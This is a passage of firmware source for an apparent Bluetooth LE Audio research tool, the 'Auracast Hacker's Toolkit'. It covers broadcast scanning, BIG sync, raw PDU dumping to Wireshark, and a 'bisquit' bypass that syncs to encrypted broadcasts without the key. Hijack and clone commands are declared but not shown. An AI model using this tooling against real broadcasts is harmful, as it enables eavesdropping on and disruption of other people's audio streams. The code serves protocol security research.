## CMakeLists.txt
```
# SPDX-License-Identifier: Apache-2.0

cmake_minimum_required(VERSION 3.20.0)
find_package(Zephyr REQUIRED HINTS $ENV{ZEPHYR_BASE})
project(auracast_hackers_toolkit)

add_subdirectory(src)
```

## Kconfig
```
# SPDX-License-Identifier: Apache-2.0
#

mainmenu "Auracast Hacker's Toolkit"

# Force enable BT_CTLR_ADV_DATA_CHAIN and BT_CTLR_ADV_SYNC_PDU_BACK2BACK
config AHT_CLONE_ADV_DATA_CHAIN
	bool
	default y
	select BT_CTLR_ADV_DATA_CHAIN
	select BT_CTLR_ADV_SYNC_PDU_BACK2BACK

source "Kconfig.zephyr"
```

## west.yml
```
manifest:
  self:
    path: auracast-hackers-toolkit

  remotes:
    - name: auracast-research
      url-base: https://github.com/auracast-research

  projects:
    - name: zephyr
      remote: auracast-research
      repo-path: zephyr
      revision: aht
      import: true
```

## prj.conf
```kconfig
CONFIG_BT=y
CONFIG_BT_OBSERVER=y
CONFIG_BT_EXT_ADV=y
CONFIG_BT_PER_ADV_SYNC=y
CONFIG_BT_ISO_SYNC_RECEIVER=y

CONFIG_BT_DEVICE_NAME="Auracast Hacker's Toolkit"

CONFIG_BT_ISO_MAX_CHAN=4
CONFIG_BT_ISO_RX_BUF_COUNT=16

CONFIG_BT_BUF_EVT_RX_SIZE=255
CONFIG_BT_BUF_EVT_RX_COUNT=16
CONFIG_BT_BUF_EVT_DISCARDABLE_SIZE=255
CONFIG_BT_BUF_EVT_DISCARDABLE_COUNT=8

CONFIG_USB_DEVICE_STACK_NEXT=y
CONFIG_USBD_CDC_ACM_CLASS=y
CONFIG_CDC_ACM_SERIAL_INITIALIZE_AT_BOOT=n
CONFIG_HWINFO=y

CONFIG_USBD_LOG_LEVEL_ERR=y
CONFIG_UDC_DRIVER_LOG_LEVEL_ERR=y
CONFIG_USBD_CDC_ACM_LOG_LEVEL_OFF=y

CONFIG_USBD_CDC_ACM_WORKQUEUE=y
CONFIG_USBD_CDC_ACM_STACK_SIZE=2048

CONFIG_BT_ISO_RX_MTU=251

CONFIG_BT_ISO_TX_MTU=251
CONFIG_BT_ISO_TX_BUF_COUNT=8

CONFIG_SERIAL=y
CONFIG_UART_INTERRUPT_DRIVEN=y
CONFIG_UART_LINE_CTRL=y

CONFIG_SHELL=y
CONFIG_SHELL_BACKEND_SERIAL=y
CONFIG_SHELL_STACK_SIZE=4096
CONFIG_SHELL_CMD_BUFF_SIZE=256
CONFIG_SHELL_HELP=y
CONFIG_SHELL_VT100_COLORS=y
CONFIG_SHELL_HISTORY=y

CONFIG_LOG=y
CONFIG_LOG_MODE_DEFERRED=y
CONFIG_LOG_BUFFER_SIZE=4096
CONFIG_ASSERT_VERBOSE=y
CONFIG_EXCEPTION_DEBUG=y
CONFIG_THREAD_NAME=y

CONFIG_PICOLIBC=y

CONFIG_BT_BROADCASTER=y
CONFIG_BT_PER_ADV=y
CONFIG_BT_ISO_BROADCASTER=y
CONFIG_BT_CTLR_ADV_ISO=y
CONFIG_BT_ISO_TEST_PARAMS=y

CONFIG_ASSERT=y
CONFIG_MAIN_STACK_SIZE=2048
CONFIG_SYSTEM_WORKQUEUE_STACK_SIZE=4096
CONFIG_HEAP_MEM_POOL_SIZE=8192
CONFIG_HW_STACK_PROTECTION=y
```

## overlay-bt_ll_sw_split.conf
```kconfig
# Zephyr Bluetooth Controller
CONFIG_BT_LL_SW_SPLIT=y

# Enable support for Broadcast ISO Sync
CONFIG_BT_CTLR_SYNC_ISO=y

# Supports the highest SDU size required by any BAP LC3 presets (155)
CONFIG_BT_CTLR_SYNC_ISO_PDU_LEN_MAX=155

# Supports the highest advertising data that is set in a single HCI command in
# Zephyr Bluetooth Controller
CONFIG_BT_CTLR_SCAN_DATA_LEN_MAX=191

# Number of supported streams
CONFIG_BT_CTLR_SYNC_ISO_STREAM_MAX=2
CONFIG_BT_CTLR_ISOAL_SINKS=2
CONFIG_BT_CTLR_ADV_DATA_LEN_MAX=50

CONFIG_BT_CTLR_SYNC_ISO_RESERVE_MAX=n
```

## boards/nrf52833dk_nrf52833.conf
```kconfig
CONFIG_USB_DEVICE_PRODUCT="Auracast Hackers Toolkit Shell"
```

## boards/nrf52840dongle_nrf52840.conf
```kconfig
CONFIG_BT_CTLR_SYNC_ISO_STREAM_MAX=4
CONFIG_BT_CTLR_ISOAL_SINKS=4

CONFIG_BT_CTLR_SYNC_ISO_SEQUENTIAL=y
CONFIG_BT_CTLR_SYNC_ISO_INTERLEAVED=y

CONFIG_BT_CTLR_RX_BUFFERS=8
CONFIG_BT_CTLR_SCAN_DATA_LEN_MAX=255

CONFIG_BT_CTLR_ISO_RX_BUFFERS=30

CONFIG_CLOCK_CONTROL_NRF_K32SRC_XTAL=y

CONFIG_BT_CTLR_ADV_ISO_STREAM_MAX=4
CONFIG_BT_CTLR_ADV_ISO_STREAM_COUNT=4

CONFIG_BT_CTLR_ISO_TX_BUFFER_SIZE=255
CONFIG_BT_CTLR_ISO_TX_BUFFERS=8

CONFIG_BT_CTLR_ISOAL_SOURCES=4

CONFIG_BT_CTLR_ADV_DATA_LEN_MAX=250
```

## boards/nrf52840dongle_nrf52840.overlay
```dts
/*
 * SPDX-License-Identifier: Apache-2.0
 *
 * Add a second USB CDC-ACM instance (`cdc_acm_data`) in addition to the
 * default `cdc_acm_uart`. The default one has console + shell,
 * the new one handles the binary PCAP stream to the Wireshark
 * extcap on the host.
 */

&zephyr_udc0 {
	cdc_acm_data: cdc_acm_data {
		compatible = "zephyr,cdc-acm-uart";
	};
};
```

## src/main.c
```c
#include <zephyr/kernel.h>
#include <zephyr/device.h>
#include <zephyr/drivers/gpio.h>
#include <zephyr/bluetooth/bluetooth.h>
#include <zephyr/logging/log.h>

#include "sniff/usbd_setup.h"
#include "sniff/usb_out.h"
#include "sniff/framing.h"
#include "sniff/bis_sink.h"
#include "sniff/cli.h"
#include "sniff/ll_capture.h"

#include "scan.h"
#include "big_sync.h"

#include "clone.h"

LOG_MODULE_REGISTER(aht_main, LOG_LEVEL_INF);

#define LED0_NODE DT_ALIAS(led0)
#if DT_NODE_HAS_STATUS(LED0_NODE, okay)
static const struct gpio_dt_spec led = GPIO_DT_SPEC_GET(LED0_NODE, gpios);
#define HAS_LED 1
#endif

int main(void)
{
	int err;

#ifdef HAS_LED
	if (gpio_is_ready_dt(&led)) {
		gpio_pin_configure_dt(&led, GPIO_OUTPUT_ACTIVE);
	}
#endif

	err = sniffer_usbd_enable();
	if (err != 0 && err != -EALREADY) {
		LOG_ERR("usbd_enable: %d", err);
		return 0;
	}

	/* Give the host a moment to open both CDC-ACM ports (extcap +
	 * shell) so first log lines aren't lost. */
	k_sleep(K_MSEC(1500));

	LOG_INF("Auracast Hacker's Toolkit starting");

	err = sniffer_usb_out_init();
	if (err) {
		LOG_ERR("usb_out init: %d", err);
	}

	err = sniffer_framing_init();
	if (err) {
		LOG_ERR("framing init: %d", err);
	}

	err = bt_enable(NULL);
	if (err) {
		LOG_ERR("bt_enable: %d", err);
		return 0;
	}

	(void)sniffer_scan_init();
	(void)big_sync_init();

	(void)sniffer_bis_sink_init();
	(void)sniffer_cli_init();

	(void)sniffer_ll_capture_init();
	LOG_INF("sniff: LLL tap active - pcap DLT = LINKTYPE_BLUETOOTH_LE_LL_WITH_PHDR (256)");

	(void)clone_init();

	while (true) {
		bool active = false;

		active = active || sniffer_bis_sink_is_active();
		active = active || big_sync_is_active();
		active = active || clone_is_active();
#ifdef HAS_LED
		if (gpio_is_ready_dt(&led)) {
			gpio_pin_toggle_dt(&led);
		}
#endif
		k_sleep(K_MSEC(active ? 200 : 500));
	}
	return 0;
}
```

## src/auracast_hackers_toolkit.h
```c
#include <errno.h>
#include <stdint.h>
#include <string.h>
#include <strings.h>
#include <stdlib.h>

#include <zephyr/bluetooth/addr.h>
#include <zephyr/bluetooth/audio/lc3.h>
#include <zephyr/bluetooth/bluetooth.h>
#include <zephyr/bluetooth/audio/audio.h>
#include <zephyr/bluetooth/audio/bap.h>
#include <zephyr/bluetooth/audio/pacs.h>
#include <zephyr/bluetooth/conn.h>
#include <zephyr/bluetooth/gap.h>
#include <zephyr/bluetooth/hci.h>
#include <zephyr/bluetooth/hci_types.h>
#include <zephyr/bluetooth/iso.h>
#include <zephyr/bluetooth/uuid.h>
#include <zephyr/net_buf.h>
#include <zephyr/sys/byteorder.h>
#include <zephyr/sys/printk.h>
#include <zephyr/sys/util.h>
#include <zephyr/shell/shell.h>

#include <zephyr/device.h>
#include <zephyr/devicetree.h>
#include <zephyr/usb/usb_device.h>
#include <zephyr/usb/class/usb_audio.h>
#include <zephyr/sys/ring_buffer.h>

#define BROADCAST_NAME_LEN                  sizeof(CONFIG_TARGET_BROADCAST_NAME) + 1
#define BROADCAST_MAX_NAME_LEN              128
#define BROADCAST_LIST_MAX_LEN              10
#define SEM_TIMEOUT                         K_SECONDS(2)
#define PA_SYNC_INTERVAL_TO_TIMEOUT_RATIO   5 /* Set the timeout relative to interval */

#define debug_printk(format,args...)        \
                  if (debug) {      \
                      printk(format, ## args);    \
                  }


struct broadcast {
    bool found;
    uint32_t broadcast_id;
    bt_addr_le_t broadcaster_addr;
    char broadcaster_name[BROADCAST_MAX_NAME_LEN];
    bool has_biginfo;
    struct bt_iso_biginfo biginfo;
    struct bt_le_per_adv_sync *broadcast_sync;
    struct bt_le_scan_recv_info broadcaster_info;
    /* we have to capture BIS spacing and subevent interval from the raw PDU because it
     * is not forwarded in the BIGInfo HCI event */
    uint32_t sub_interval;
    uint32_t bis_spacing;
};

/* this is taken from pdu.h to work without pdu_biginfo struct definition */
#define PDU_BIG_INFO_SPACING_GET(bi) \
	_util_get_bits(bi+8, 0, 20)
#define PDU_BIG_INFO_SUB_INTERVAL_GET(bi) \
	_util_get_bits(bi+5, 0, 20)

// Scan Commands
int scan_on(const struct shell *sh, size_t argc, char **argv);
int scan_off(const struct shell *sh, size_t argc, char **argv);
int scan_list(const struct shell *sh, size_t argc, char **argv);
int scan_biginfo(const struct shell *sh, size_t argc, char **argv);

// Broadcast Commands
int broadcast_list(const struct shell *sh, size_t argc, char **argv);
int broadcast_dump(const struct shell *sh, size_t argc, char **argv);
int broadcast_bisquit(const struct shell *sh, size_t argc, char **argv);
int broadcast_hijack(const struct shell *sh, size_t argc, char **argv);

extern bool bt_enabled;
extern bool debug;
extern struct broadcast broadcasts[BROADCAST_LIST_MAX_LEN];
extern uint8_t cur_bcast;
extern struct k_sem sem_biginfo;

struct broadcast* get_broadcast_at_idx(const uint8_t idx);
struct broadcast* get_broadcast_with_id(uint32_t broadcast_id);
struct broadcast* get_broadcast_with_addr(const bt_addr_le_t *addr);
int pa_sync_create(struct broadcast *b);

void set_active_broadcast_prompt(struct broadcast *b);
void remove_active_broadcast_prompt();
struct broadcast *get_active_broadcast();

bool is_substring(const char *substr, const char *str);
const char *phy2str(uint8_t phy);
uint32_t _util_get_bits(uint8_t *data, uint8_t bit_offs, uint8_t num_bits);
```

## src/big_sync.c
```c
#include "big_sync.h"

#include "sniff/bis_sink.h"

#include "clone.h"

#include "bison_lll_hijack.h"

#include "sniffer_tap.h"

#include <string.h>

#include <zephyr/kernel.h>
#include <zephyr/net_buf.h>
#include <zephyr/bluetooth/bluetooth.h>
#include <zephyr/bluetooth/hci_types.h>
#include <zephyr/bluetooth/iso.h>
#include <zephyr/sys/util.h>
#include <zephyr/logging/log.h>

LOG_MODULE_REGISTER(big_sync, LOG_LEVEL_INF);

#define PA_SYNCED_TIMEOUT_MS   2000
#define BIGINFO_TIMEOUT_MS     3000
#define BIS_UP_TIMEOUT_MS     10000
#define PA_RETRY_COUNT            6

/* We always sync exactly one BIS */
#define BIG_SYNC_NUM_BIS 1U

static struct bt_iso_chan_io_qos rx_qos;
static struct bt_iso_chan_qos    qos;
static struct bt_iso_chan        iso_chan;
static struct bt_iso_chan       *iso_chans[BIG_SYNC_NUM_BIS];

static struct bt_le_per_adv_sync *pa;
static struct bt_iso_big         *big;

static struct bt_iso_biginfo cached_biginfo;
static bt_addr_le_t          cached_biginfo_addr;

static uint8_t  pa_payload[BIG_SYNC_PA_PAYLOAD_MAX];
static size_t   pa_payload_len;
static bool     pa_payload_valid;
static K_SEM_DEFINE(sem_pa_payload, 0, 1);

static uint8_t bis_last_disc_reason;

static K_SEM_DEFINE(sem_pa_synced, 0, 1);
static K_SEM_DEFINE(sem_biginfo,   0, 1);
static K_SEM_DEFINE(sem_bis_up,    0, BIG_SYNC_NUM_BIS);

static void iso_recv(struct bt_iso_chan *chan,
		     const struct bt_iso_recv_info *info,
		     struct net_buf *buf)
{
	ARG_UNUSED(chan);
	ARG_UNUSED(info);
	ARG_UNUSED(buf);
}

static void iso_connected(struct bt_iso_chan *chan)
{
	ARG_UNUSED(chan);
	bis_last_disc_reason = 0U;
	LOG_INF("big_sync: BIS 1 connected");
	k_sem_give(&sem_bis_up);
}

static void iso_disconnected(struct bt_iso_chan *chan, uint8_t reason)
{
	ARG_UNUSED(chan);
	bis_last_disc_reason = reason ? reason : 0xFFU;
	LOG_INF("big_sync: BIS 1 disconnected (reason 0x%02x)", reason);
	k_sem_give(&sem_bis_up);
}

static struct bt_iso_chan_ops iso_ops = {
	.recv         = iso_recv,
	.connected    = iso_connected,
	.disconnected = iso_disconnected,
};

static void pa_synced_cb(struct bt_le_per_adv_sync *sync,
			 struct bt_le_per_adv_sync_synced_info *info)
{
	ARG_UNUSED(sync);
	ARG_UNUSED(info);
	LOG_INF("big_sync: PA sync established");
	k_sem_give(&sem_pa_synced);
}

static void pa_term_cb(struct bt_le_per_adv_sync *sync,
		       const struct bt_le_per_adv_sync_term_info *info)
{
	ARG_UNUSED(sync);
	ARG_UNUSED(info);
	LOG_WRN("big_sync: PA sync terminated");
}

static void pa_biginfo_cb(struct bt_le_per_adv_sync *sync,
			  const struct bt_iso_biginfo *biginfo)
{
	ARG_UNUSED(sync);
	if (biginfo->addr != NULL) {
		bt_addr_le_copy(&cached_biginfo_addr, biginfo->addr);
	}
	cached_biginfo = *biginfo;
	cached_biginfo.addr = &cached_biginfo_addr;
	k_sem_give(&sem_biginfo);
}

static void pa_recv_cb(struct bt_le_per_adv_sync *sync,
		       const struct bt_le_per_adv_sync_recv_info *info,
		       struct net_buf_simple *buf)
{
	ARG_UNUSED(sync);
	ARG_UNUSED(info);

	if (pa_payload_valid) {
		return; /* already captured */
	}
	if (buf->len > sizeof(pa_payload)) {
		LOG_WRN("big_sync: PA payload %u > %u, truncating",
			buf->len, (unsigned)sizeof(pa_payload));
		pa_payload_len = sizeof(pa_payload);
	} else {
		pa_payload_len = buf->len;
	}
	memcpy(pa_payload, buf->data, pa_payload_len);
	pa_payload_valid = true;
	k_sem_give(&sem_pa_payload);
}

static struct bt_le_per_adv_sync_cb pa_cb = {
	.synced  = pa_synced_cb,
	.term    = pa_term_cb,
	.biginfo = pa_biginfo_cb,
	.recv    = pa_recv_cb,
};

/* ----- Public API ----- */

int big_sync_init(void)
{
	qos.rx        = &rx_qos;
	iso_chan.ops  = &iso_ops;
	iso_chan.qos  = &qos;
	iso_chans[0]  = &iso_chan;
	bt_le_per_adv_sync_cb_register(&pa_cb);
	return 0;
}

#define BIG_SYNC_TRACE(sh, ...)                          \
	do {                                             \
		if ((sh) != NULL) {                      \
			shell_print((sh), __VA_ARGS__);  \
		} else {                                 \
			LOG_INF(__VA_ARGS__);            \
		}                                        \
	} while (0)

static int pa_sync_and_biginfo(const struct sniffer_candidate *cand,
			       const struct shell *sh)
{
	int err;

	if (!sniffer_scan_is_active()) {
		BIG_SYNC_TRACE(sh, "big_sync: starting discovery scan");
		err = sniffer_scan_start();
		if (err && err != -EALREADY) {
			BIG_SYNC_TRACE(sh, "big_sync: scan_start failed: %d", err);
			return err;
		}
	}

	k_sem_reset(&sem_pa_synced);
	k_sem_reset(&sem_biginfo);
	k_sem_reset(&sem_pa_payload);
	pa_payload_valid = false;
	pa_payload_len   = 0U;

	struct bt_le_per_adv_sync_param sp = {0};

	bt_addr_le_copy(&sp.addr, &cand->addr);
	sp.sid     = cand->sid;
	sp.options = 0U;
	sp.skip    = 0U;

	uint32_t interval_us = cand->pa_interval_us ? cand->pa_interval_us : 100000U;
	uint32_t timeout_10ms = (interval_us * PA_RETRY_COUNT) / (10U * USEC_PER_MSEC);

	sp.timeout = (uint16_t)CLAMP(timeout_10ms, 10U, 0xFFFFU);

	BIG_SYNC_TRACE(sh, "big_sync: creating PA sync (sid=%u timeout=%u)",
		       sp.sid, sp.timeout);

	err = bt_le_per_adv_sync_create(&sp, &pa);
	if (err) {
		BIG_SYNC_TRACE(sh, "big_sync: bt_le_per_adv_sync_create: %d", err);
		return err;
	}

	BIG_SYNC_TRACE(sh, "big_sync: waiting for PA synced event (up to %u ms)",
		       PA_SYNCED_TIMEOUT_MS);

	err = k_sem_take(&sem_pa_synced, K_MSEC(PA_SYNCED_TIMEOUT_MS));
	if (err) {
		BIG_SYNC_TRACE(sh, "big_sync: PA sync TIMEOUT");
		goto fail;
	}

	BIG_SYNC_TRACE(sh, "big_sync: PA synced, waiting for BIGInfo (up to %u ms)",
		       BIGINFO_TIMEOUT_MS);

	err = k_sem_take(&sem_biginfo, K_MSEC(BIGINFO_TIMEOUT_MS));
	if (err) {
		BIG_SYNC_TRACE(sh, "big_sync: BIGInfo TIMEOUT");
		goto fail;
	}

	BIG_SYNC_TRACE(sh, "big_sync: BIGInfo OK (num_bis=%u iso_int=%u enc=%u)",
		       cached_biginfo.num_bis, cached_biginfo.iso_interval,
		       cached_biginfo.encryption);

	return 0;

fail:
	bt_le_per_adv_sync_delete(pa);
	pa = NULL;
	return err;
}

int big_sync_start(const struct sniffer_candidate *cand,
		   const uint8_t *bcode, size_t bcode_len,
		   const struct shell *sh)
{
	int err;

	BIG_SYNC_TRACE(sh, "big_sync: entered start");

	if (big != NULL || pa != NULL) {
		BIG_SYNC_TRACE(sh, "big_sync: EBUSY - big or pa non-NULL");
		return -EBUSY;
	}

	if (sniffer_bis_sink_is_active()) {
		BIG_SYNC_TRACE(sh, "big_sync: EBUSY - `sniff start` owns the BIG sync");
		return -EBUSY;
	}
	if (clone_is_active()) {
		BIG_SYNC_TRACE(sh, "big_sync: EBUSY - `clone start` owns the radio");
		return -EBUSY;
	}

	k_sem_reset(&sem_bis_up);
	bis_last_disc_reason = 0U;

	err = pa_sync_and_biginfo(cand, sh);
	if (err) {
		return err;
	}

	(void)sniffer_scan_stop();

	if (cached_biginfo.num_bis == 0U) {
		BIG_SYNC_TRACE(sh, "big_sync: BIG has zero BIS");
		err = -EINVAL;
		goto fail_after_pa;
	}

	struct bt_iso_big_sync_param sync_param = {
		.bis_channels = iso_chans,
		.num_bis      = BIG_SYNC_NUM_BIS,
		.bis_bitfield = BT_ISO_BIS_INDEX_BIT(1U),
		.mse          = BT_ISO_SYNC_MSE_ANY,
		.sync_timeout = 100U, /* 100 * 10 ms = 1 s */
		.encryption   = cached_biginfo.encryption,
	};

	if (cached_biginfo.encryption) {
		if (bcode != NULL && bcode_len != 0U) {
			size_t copy = MIN(bcode_len, sizeof(sync_param.bcode));

			memcpy(sync_param.bcode, bcode, copy);
		} else {
			if (!bison_lll_hijack_bisquit_bypass_get()) {
				BIG_SYNC_TRACE(sh,
					"big_sync: encrypted BIG - set `scan "
					"bcode <target> <hex>` first (or use "
					"`bisquit start` which turns on the "
					"MIC-fail bypass)");
				err = -EACCES;
				goto fail_after_pa;
			}
			sync_param.encryption = 0U;
			/* No decryptable BIG_CHANNEL_MAP_IND without the bcode:
			 * follow channel-map updates via the cleartext BIGInfo
			 * so we don't desync when the sender re-maps channels. */
			sniffer_tap_chm_follow_set(true);
			BIG_SYNC_TRACE(sh, "big_sync: encrypted BIG, bisquit "
					   "bypass on - forwarding ciphertext "
					   "(no MIC check), chmfollow on");
		}
	}

	BIG_SYNC_TRACE(sh, "big_sync: calling bt_iso_big_sync (num_bis=%u enc=%u)",
		       sync_param.num_bis, sync_param.encryption);

	err = bt_iso_big_sync(pa, &sync_param, &big);
	if (err) {
		BIG_SYNC_TRACE(sh, "big_sync: bt_iso_big_sync failed: %d", err);
		goto fail_after_pa;
	}

	BIG_SYNC_TRACE(sh, "big_sync: bt_iso_big_sync OK, waiting for BIS up "
			   "(up to %u ms)", BIS_UP_TIMEOUT_MS);

	err = k_sem_take(&sem_bis_up, K_MSEC(BIS_UP_TIMEOUT_MS));
	if (err) {
		BIG_SYNC_TRACE(sh, "big_sync: BIS didn't come up in %d ms "
				   "(no callback fired - LL never emitted a "
				   "sync-established event)", BIS_UP_TIMEOUT_MS);
		bt_iso_big_terminate(big);
		big = NULL;
		goto fail_after_pa;
	}

	if (bis_last_disc_reason != 0U) {
		BIG_SYNC_TRACE(sh, "big_sync: LL rejected sync (disconnect "
				   "reason 0x%02x)", bis_last_disc_reason);
		bt_iso_big_terminate(big);
		big = NULL;
		err = -ECONNREFUSED;
		goto fail_after_pa;
	}

	BIG_SYNC_TRACE(sh, "big_sync: BIS 1 up - snapshot is populating");
	return 0;

fail_after_pa:
	if (pa != NULL) {
		bt_le_per_adv_sync_delete(pa);
		pa = NULL;
	}
	return err;
}

int big_sync_stop(void)
{
	if (big != NULL) {
		bt_iso_big_terminate(big);
		big = NULL;
	}
	if (pa != NULL) {
		bt_le_per_adv_sync_delete(pa);
		pa = NULL;
	}
	return 0;
}

bool big_sync_is_active(void)
{
	return big != NULL;
}

void big_sync_status(char *out, size_t out_sz)
{
	uint32_t iso_us = (uint32_t)cached_biginfo.iso_interval * 1250U;

	snprintk(out, out_sz,
		 "pa=%s big=%s num_bis_in_big=%u iso_interval=%u.%03u ms "
		 "enc=%u framing=%u phy=%u max_pdu=%u",
		 pa != NULL ? "yes" : "no",
		 big != NULL ? "yes" : "no",
		 cached_biginfo.num_bis,
		 iso_us / 1000U, iso_us % 1000U,
		 cached_biginfo.encryption,
		 cached_biginfo.framing,
		 cached_biginfo.phy,
		 cached_biginfo.max_pdu);
}

int big_sync_biginfo_only(const struct sniffer_candidate *cand,
			  struct bt_iso_biginfo *out_biginfo,
			  uint8_t *out_pa_payload,
			  size_t *out_pa_payload_len,
			  const struct shell *sh)
{
	int err;

	if (pa != NULL || big != NULL) {
		BIG_SYNC_TRACE(sh, "big_sync: EBUSY - existing sync in flight");
		return -EBUSY;
	}

	if (sniffer_bis_sink_is_active()) {
		BIG_SYNC_TRACE(sh, "big_sync: EBUSY - `sniff start` owns the "
				   "PA sync path");
		return -EBUSY;
	}
	if (clone_is_active()) {
		BIG_SYNC_TRACE(sh, "big_sync: EBUSY - `clone start` owns the "
				   "radio");
		return -EBUSY;
	}

	err = pa_sync_and_biginfo(cand, sh);
	if (err) {
		return err;
	}

	(void)sniffer_scan_stop();

	if (out_biginfo != NULL) {
		*out_biginfo = cached_biginfo;
		out_biginfo->addr = &cached_biginfo_addr;
	}

	if (out_pa_payload != NULL && out_pa_payload_len != NULL) {
		BIG_SYNC_TRACE(sh, "big_sync: waiting for PA payload "
				   "(up to 500 ms)");

		err = k_sem_take(&sem_pa_payload, K_MSEC(500));
		if (err) {
			BIG_SYNC_TRACE(sh, "big_sync: PA payload TIMEOUT "
					   "(source might broadcast BIGInfo-only, "
					   "no BASE)");
			*out_pa_payload_len = 0U;
		} else {
			memcpy(out_pa_payload, pa_payload, pa_payload_len);
			*out_pa_payload_len = pa_payload_len;
			BIG_SYNC_TRACE(sh, "big_sync: captured PA payload "
					   "(%u bytes)",
				       (unsigned)pa_payload_len);
		}
	}

	bt_le_per_adv_sync_delete(pa);
	pa = NULL;
	return 0;
}
```

## src/big_sync.h
```c
#ifndef BIG_SYNC_H_
#define BIG_SYNC_H_

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

#include <zephyr/bluetooth/iso.h>
#include <zephyr/shell/shell.h>

#include "scan.h"

int  big_sync_init(void);

int  big_sync_start(const struct sniffer_candidate *cand,
		    const uint8_t *bcode, size_t bcode_len,
		    const struct shell *sh);

int  big_sync_stop(void);
bool big_sync_is_active(void);

void big_sync_status(char *out, size_t out_sz);

#define BIG_SYNC_PA_PAYLOAD_MAX 253U

int  big_sync_biginfo_only(const struct sniffer_candidate *cand,
			   struct bt_iso_biginfo *out_biginfo,
			   uint8_t *out_pa_payload,
			   size_t *out_pa_payload_len,
			   const struct shell *sh);

#endif /* BIG_SYNC_H_ */
```

## src/broadcast.c
```c
#include "auracast_hackers_toolkit.h"

struct bt_iso_big *big;

struct broadcast* get_broadcast_at_idx(const uint8_t idx) {
    if (idx > cur_bcast || idx > ARRAY_SIZE(broadcasts)) {
        return NULL;
    }
    return &broadcasts[idx];
}

struct broadcast* get_broadcast_with_id(const uint32_t broadcast_id) {
    for (int i = 0; i<ARRAY_SIZE(broadcasts); i++) {
        if (broadcasts[i].broadcast_id == broadcast_id) {
            return &broadcasts[i];
        }
    }
    return NULL;
}

struct broadcast* get_broadcast_with_addr(const bt_addr_le_t *addr) {
    for (int i = 0; i<ARRAY_SIZE(broadcasts); i++) {
        if (bt_addr_le_eq(&broadcasts[i].broadcaster_addr, addr)) {
            return &broadcasts[i];
        }
    }
    return NULL;
}

bool broadcast_is_interleaved(const struct broadcast *b) {
    /* whenever the BIS spacing is smaller than the subevent spacing
     * the stream is interleaved */
    if (b->sub_interval > 0 && b->bis_spacing > 0) {
        return b->bis_spacing < b->sub_interval;
    }
    /* if we have weird spacing and interval values we just assume sequential */
    return false;
}

void iso_raw_dump_cb(struct net_buf *buf) {

	struct bt_hci_evt_iso_raw_dump *evt = (void *)buf->data;
	char hexout[256 * 2];
 
    // TODO: make this configurable
	size_t print_interval = 1;

	bin2hex(buf->data + sizeof(*evt), evt->len, hexout, sizeof(hexout));
	if (evt->type == BT_HCI_EVT_ISO_RAW_DUMP_PDU) {
		// Only log packets that carry data (header is 2 bytes)
		if (evt->payload_number % print_interval == 0) {
		    printk("PDU %lld,%d,%s\r\n", evt->payload_number, evt->len, hexout);
		}
	} else if (evt->type == BT_HCI_EVT_ISO_RAW_DUMP_BIG) {
		printk("BIGInfo %d,%s\r\n", evt->len, hexout);
        k_sem_give(&sem_biginfo);
	}
}

int broadcast_list(const struct shell *sh, size_t argc, char **argv) {
    ARG_UNUSED(argc);
    ARG_UNUSED(argv);

    for (int i = 0; i < ARRAY_SIZE(broadcasts); i++){
        struct broadcast *b = &broadcasts[i];

        if (!bt_addr_le_eq(&b->broadcaster_addr, &bt_addr_le_any)) {
            char le_addr[BT_ADDR_LE_STR_LEN];
            bt_addr_le_to_str(&b->broadcaster_addr, le_addr, sizeof(le_addr));
            shell_print(sh, "[%d] Broadcast: %s (0x%x), BD Addr: %s", i, b->broadcaster_name, b->broadcast_id, le_addr);

            // if we have a BIGInfo for a broadcast, print it
            struct bt_iso_biginfo *biginfo = &b->biginfo;
            if (b->has_biginfo) {
                bool is_interleaved = broadcast_is_interleaved(b);
                shell_print(sh, "\tBIG Info: sid 0x%02x, "
                    "num_bis %u, nse %u, interval 0x%04x (%u ms), "
                    "bn %u, pto %u, irc %u, max_pdu %u, "
                    "sdu_interval %u us, max_sdu %u, phy %s, "
                    "%s framing, %sencrypted, bis_spacing: %d µs, "
                    "sub_interval: %d µs, %s",
                    biginfo->sid,
                    biginfo->num_bis, biginfo->sub_evt_count,
                    biginfo->iso_interval,
                    (biginfo->iso_interval * 5 / 4),
                    biginfo->burst_number, biginfo->offset,
                    biginfo->rep_count, biginfo->max_pdu, biginfo->sdu_interval,
                    biginfo->max_sdu, phy2str(biginfo->phy),
                    biginfo->framing ? "with" : "without",
                    biginfo->encryption ? "" : "not ",
                    b->bis_spacing, b->sub_interval,
                    is_interleaved ? "interleaved" : "sequential");
            }
        }
    }

    return 0;
}

static void iso_recv(struct bt_iso_chan *chan, const struct bt_iso_recv_info *info, struct net_buf *buf) {
}

static void iso_connected(struct bt_iso_chan *chan) {
	printk("ISO Channel %p connected\n", chan);
}

static void iso_disconnected(struct bt_iso_chan *chan, uint8_t reason) {
	printk("ISO Channel %p disconnected with reason 0x%02x\n", chan, reason);
}

/* TODO: currently this hard-codes a BIG with 2 BIS */
struct bt_iso_chan_ops iso_ops = {
    .recv		= iso_recv,
    .connected	= iso_connected,
    .disconnected	= iso_disconnected,
};
struct bt_iso_chan_io_qos iso_rx_qos[2];

struct bt_iso_chan_qos bis_iso_qos[] = {
    { .rx = &iso_rx_qos[0], },
    { .rx = &iso_rx_qos[1], },
};

struct bt_iso_chan bis_iso_chan[] = {
    { .ops = &iso_ops,
    .qos = &bis_iso_qos[0], },
    { .ops = &iso_ops,
    .qos = &bis_iso_qos[1], },
};

struct bt_iso_chan *bis[] = {
    &bis_iso_chan[0],
    &bis_iso_chan[1],
};

int broadcast_dump(const struct shell *sh, size_t argc, char **argv) {

    int err;
    uint8_t broadcast_idx;
    struct broadcast *b;
    uint8_t *broadcast_code = NULL;
    
    if (argc < 2) {
        shell_error(sh, "Error: Missing broadcast ID parameter for dump.");
        return 1;
    }

    if (strcmp(argv[1], "stop") == 0) {
        b = get_active_broadcast();
        if(b) {
            err = bt_iso_big_terminate(big);
            if (err) {
                shell_error(sh, "Error terminating BIG: %d", err);
                return 1;
            }
            err = bt_le_per_adv_sync_delete(b->broadcast_sync);
            if (err) {
                shell_error(sh, "Error terminating periodic advertisment sync: %d", err);
                return 1;
            }
            // unregister raw iso callback
            bt_hci_iso_raw_dump_cb_register(NULL);
            remove_active_broadcast_prompt();
            return 0;
        } else {
            shell_error(sh, "No active broadcast to stop");
            return 1;
        }
    }

    broadcast_idx = strtol(argv[1], NULL, 10);
    if (broadcast_idx < 0 || broadcast_idx > cur_bcast) {
